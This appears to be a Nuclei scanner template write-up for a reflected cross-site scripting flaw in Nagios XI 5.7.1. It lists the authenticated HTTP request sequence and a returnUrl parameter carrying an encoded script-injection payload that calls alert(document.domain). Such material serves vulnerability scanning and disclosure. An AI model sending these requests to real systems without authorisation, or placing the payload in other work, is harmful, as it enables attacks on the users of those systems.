# Nuclei Template: Nagios XI 5.7.1 - Cross-Site Scripting
**Template ID:** nagios-xi-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`nagios-xi-xss.yaml`)

## Vulnerability Information & PoC

## Description
A reflected cross-site scripting (XSS) in Nagios XI 5.7.1 can result in an attacker performing malicious actions to users who open a maliciously crafted link or third-party web page.

## Steps to reproduce / Exploit Payload
```http
GET /nagioslogserver/login HTTP/1.1
Host: {{Hostname}}

POST /nagioslogserver/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

csrf_ls={{csrf}}&username={{username}}&password={{password}}

GET /nagioslogserver/includes/components/ccm/?cmd=modify&id=1&page=1&returnUrl=%22%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&type=host HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/EmreOvunc/Nagios-XI-Reflected-XSS?tab=readme-ov-file
